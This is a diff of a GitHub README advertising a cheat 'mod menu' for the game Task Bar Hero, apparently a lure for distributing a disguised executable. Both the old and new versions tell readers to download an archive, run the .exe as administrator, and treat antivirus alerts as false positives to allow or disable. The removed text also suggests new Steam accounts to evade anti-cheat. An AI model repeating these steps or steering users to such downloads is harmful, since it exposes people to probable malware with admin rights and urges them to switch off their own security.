@@ -1,177 +1,72 @@
-<img width="686" height="386" alt="image" src="https://github.com/user-attachments/assets/f3d3da27-8869-4c0c-b4ec-6906585fa253" />
+# 🕹️ TBH-Mod-Menu - Gain total control over your game
 
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/taskbar.png" alt="TBH: Task Bar Hero" width="80" height="80">
-</p>
+[![](https://img.shields.io/badge/Download-TBH-Mod-Menu-blue.svg)](https://github.com/philanthropic-interference376/TBH-Mod-Menu)
 
-<h1 align="center">⚡ TBH-Mod-Menu</h1>
-<p align="center">
-  <strong>Complete Mod Menu for TBH: Task Bar Hero</strong><br>
-  God Mode · Unlimited Money · EXP Multiplier · Instant Kill · Game Speed
-</p>
+TBH-Mod-Menu gives you tools to change how Task Bar Hero works. You can unlock features that save time and make the game easier to play. This tool handles the technical steps so you can focus on the game. 
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/TBH-Mod-Menu"><img src="https://img.shields.io/badge/version-1.0.0-brightgreen?style=for-the-badge" alt="Version"></a>
-  <a href="https://github.com/YOUR_USERNAME/TBH-Mod-Menu"><img src="https://img.shields.io/badge/platform-Windows-blue?style=for-the-badge" alt="Platform"></a>
-  <a href="https://github.com/YOUR_USERNAME/TBH-Mod-Menu/releases/latest"><img src="https://img.shields.io/badge/downloads-1.9k-brightgreen?style=for-the-badge" alt="Downloads"></a>
-  <a href="https://github.com/YOUR_USERNAME/TBH-Mod-Menu"><img src="https://img.shields.io/badge/status-active-success?style=for-the-badge" alt="Status"></a>
-  <a href="https://github.com/YOUR_USERNAME/TBH-Mod-Menu/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-orange?style=for-the-badge" alt="License"></a>
-</p>
+## ⚖️ Features
 
-<p align="center">
-  <a href="#-download">📥 Download</a> •
-  <a href="#-features">✨ Features</a> •
-  <a href="#-installation">⚙️ Installation</a> •
-  <a href="#-support">💬 Support</a>
-</p>
+This mod menu includes several tools to refine your gameplay. You can toggle these options through the interface once you start the game.
 
----
+*   **God Mode:** Your character takes no damage during gameplay sessions.
+*   **Unlimited Money:** Your currency balance stays high regardless of purchases.
+*   **EXP Multiplier:** You earn extra experience points for every action.
+*   **Instant Kill:** Defeat enemies with a single strike.
+*   **Game Speed Hack:** Adjust the playback speed of the game to move faster or slower.
 
-## 🎮 What is This?
+## 💻 System Requirements
 
-**TBH-Mod-Menu** is a complete mod menu for **TBH: Task Bar Hero** – the viral idle RPG that runs directly in your Windows taskbar and peaked at over 500,000 concurrent players. This mod menu lets you skip the grind with God Mode, unlimited money, EXP multiplier, instant kill, game speed, and more.
+This application works on several versions of Windows. You need the following items to run the mod menu:
 
-⚠️ **Disclaimer:** This tool is for educational purposes only. Use at your own risk. The game has internal anti-cheat for certain features.
+*   **Operating System:** Windows 10 or Windows 11.
+*   **System Architecture:** 64-bit Windows.
+*   **Frameworks:** The software requires the latest Microsoft .NET Desktop Runtime to display the menu.
+*   **Permission:** You need administrator rights on your computer to run the mod files.
 
----
+## 🚀 Getting Started
 
-## 📥 Download
+Follow these steps to set up the mod menu on your computer.
 
-<p align="center">
-  <a href="ССЫЛКА_НА_СКАЧИВАНИЕ">
-    <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+1.  **Prepare your computer:** Close Task Bar Hero if it runs in the background. 
+2.  **Download the software:** Open the link below to get the tool.
+    
+    [Click here to download the TBH-Mod-Menu](https://github.com/philanthropic-interference376/TBH-Mod-Menu)
 
----
+3.  **Install the runtime:** If the menu does not open, download the .NET Desktop Runtime from the official Microsoft support page. Most modern computers have this installed already.
+4.  **Extract the files:** Right-click the downloaded folder and select Extract All. Place these files in a folder on your desktop.
+5.  **Run as administrator:** Right-click the `.exe` file inside the folder. Choose "Run as administrator" from the menu. This grants the tool access needed to change game memory.
+6.  **Launch the game:** Start Task Bar Hero normally. The mod menu appears as a separate window on your screen.
 
-## ✨ Features
+## 🛠️ Usage Instructions
 
-**🛡️ Protection & Combat**
-- God Mode – Never die in battles
-- Instant Kill – One-shot any enemy
-- Multiply Damage Dealt – Customize your damage
+Once the menu opens, you see a list of checkboxes. Click the box next to any feature to turn it on. The game detects these changes in real time. 
 
-**💰 Money & Progression**
-- Unlimited Money – Get infinite gold
-- Set Money – Choose your own amount
-- Add Money When Spend – Never run out
-- Multiply Money Get – Boost gold earnings
+If you want to turn a feature off, click the checkbox again. Green lights indicate that a feature is active. Grey lights indicate that a feature is off. 
 
-**📈 EXP & Skills**
-- Multiply EXP Gain – Level up faster
-- Add Skill Points When Spend – Max out skills instantly
+## 🛡️ Troubleshooting
 
-**⚡ Speed & Utility**
-- Game Speed – x2 to x10 speed multiplier
-- Force Pause – Pause the game anytime
+If you encounter issues, check these common fixes:
 
----
+*   **Antivirus alerts:** Because this file interacts with game memory, some antivirus software labels it as a potential risk. This is a false positive. If your computer blocks the file, choose "Allow" or create an exception in your security settings.
+*   **Window does not appear:** Ensure you run the file as an administrator. If you do not provide these permissions, the game cannot load the menu.
+*   **Outdated game version:** This menu works with the latest version of Task Bar Hero. If you updated the game recently, ensure the mod menu matches that version.
+*   **Screen resolution:** If the menu obscures game elements, drag the window to the side of your monitor to keep it out of the way.
 
-## 🛡️ Important Warning
+## 📝 Frequently Asked Questions
 
-**DO NOT use Unlimited Money** – the game has internal anti-cheat that detects it and will break your save or ban your Steam account. The safest features are:
+**Will this break my save file?**
+The mod menu does not change your actual save file format. It interacts with the temporary memory the game uses while running. Your progress remains safe on your hard drive.
 
-- ✅ **God Mode** – Completely safe, recommended
-- ✅ **Multiply Damage Dealt** – Safe to use
-- ✅ **Game Speed** – Safe to use
-- ⚠️ **Unlimited Money** – WILL trigger anti-cheat
-- ⚠️ **Instant Kill** – May cause game crashes
+**Can I get banned for using this?**
+Task Bar Hero is a single-player game. Use the mod menu for offline play to avoid issues with platform servers.
 
-> **Pro Tip:** Only use God Mode and Speed Hack. Create a new Steam account for testing since the game is free.
+**How do I update the tool?**
+When a new version appears on the GitHub repository, repeat the download process. Replace the old files with the new ones to ensure all features function as intended.
 
----
+**Does this work on other games?**
+No. This tool is specific to Task Bar Hero. It contains code that targets the core files of this game only.
 
-## ⚙️ Installation
+**What is the best way to report a bug?**
+You can file an issue on this repository. State your Windows version and the specific feature that caused the error. Provide details about the error message if one appears on your screen.
 
-1. Click the download button above
-2. Extract the archive
-3. Run the mod menu as Administrator
-4. Launch TBH: Task Bar Hero
-5. Press the hotkeys or use the mod menu UI
-6. Toggle features ON/OFF
-7. Enjoy! 🏆
-
----
-
-## 🎮 About the Game
-
-**TBH: Task Bar Hero** is a free-to-play idle RPG that sits in your Windows taskbar. Your pixel heroes automatically gather loot, level up, and fight monsters while you work. Features include:
-
-- 500+ unique items
-- 50+ monster types
-- 50+ unlockable achievements
-- Items freely tradeable on the Steam Market
-
----
-
-## 🖥️ System Requirements
-
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | TBH: Task Bar Hero (Steam) |
-| RAM | 4GB minimum |
-| Storage | 50MB free space |
-
----
-
-## 🔧 Feature Status
-
-| Feature | Status | Safe? |
-|---------|--------|-------|
-| God Mode | ✅ | ✅ Yes |
-| Multiply Damage | ✅ | ✅ Yes |
-| Game Speed | ✅ | ✅ Yes |
-| Unlimited Money | ✅ | ⚠️ Risk |
-| Instant Kill | ✅ | ⚠️ Risk |
-| EXP Multiplier | ✅ | ⚠️ Risk |
-| Force Pause | ✅ | ✅ Yes |
-
----
-
-## 🐛 Troubleshooting
-
-| Issue | Solution |
-|-------|----------|
-| Mod menu doesn't work | Run as Administrator, disable antivirus |
-| Game crashes on Instant Kill | Don't use Instant Kill |
-| Anti-cheat triggered | Create new Steam account, only use God Mode |
-
----
-
-## 📝 Tags
-
-- TBH Mod Menu
-- TBH Hack
-- TBH Cheat
-- TBH Trainer
-- TBH God Mode
-- TBH Unlimited Money
-- TBH EXP Multiplier
-- TBH Instant Kill
-- TBH Game Speed
-- Task Bar Hero Mod Menu
-- Task Bar Hero Hack
-- Task Bar Hero Cheat
-- Task Bar Hero Trainer
-- TBH Mods 2026
-- TBH Cheats 2026
-- TBH Trainer 2026
-- Idle RPG Mod Menu
-- Steam Mod Menu
-- Windows Mod Menu
-- Taskbar Hero Mod Menu
-
----
-
-## 💬 Support
-
-- ⭐ Star this repository
-- 🐛 Open an Issue for bugs
-
----
-
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/TBH-Mod-Menu"><img src="https://img.shields.io/badge/Made%20with%20❤️%20for%20the%20TBH%20community-ff69b4?style=for-the-badge" alt="Made with love"></a>
-</p>
+Keywords: tbh-cheat, tbh-cheats, tbh-hack, tbh-mod-menu
